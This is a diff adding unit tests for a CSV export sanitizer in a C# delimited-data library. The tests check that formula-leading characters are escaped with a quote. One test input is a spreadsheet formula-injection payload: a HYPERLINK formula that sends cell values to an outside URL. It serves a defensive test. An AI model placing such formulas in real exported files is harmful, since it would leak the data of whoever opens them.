@@ -585,6 +585,86 @@ namespace DelimitedDataParser
                 output);
         }
 
+        [Theory]
+        [InlineData("=", "'=")]
+        [InlineData("+", "'+")]
+        [InlineData("-", "'-")]
+        [InlineData("@", "'@")]
+        [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"'=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")")]
+        public void Sanitizer_Escapes_Blacklisted_Characters(string inputString, string expectedOutput)
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, inputString, inputString);
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = false,
+                SantizeStrings = true
+            };
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                "One,Two" + Environment.NewLine
+                + string.Concat(expectedOutput + ",", expectedOutput),
+                output);
+        }
+
+        [Theory]
+        [InlineData("abcdef")]
+        [InlineData("abc + def - ghi @ jkl")]
+        [InlineData(" =")]
+        [InlineData(" +")]
+        [InlineData(" -")]
+        [InlineData(" @")]
+        public void Sanitizer_Does_Not_Escape_Safe_Input(string inputString)
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, inputString, inputString);
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = false,
+                SantizeStrings = true
+            };
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                "One,Two" + Environment.NewLine
+                + string.Concat(inputString + ",", inputString),
+                output);
+        }
+
+        [Fact]
+        public void Sanitizer_Ignores_Null_Values()
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, null, null);
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = false,
+                SantizeStrings = true
+            };
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                "One,Two" + Environment.NewLine
+                + ",",
+                output);
+        }
+
         private static void AddColumn(DataTable table, string columnName)
         {
             table.Columns.Add(columnName);
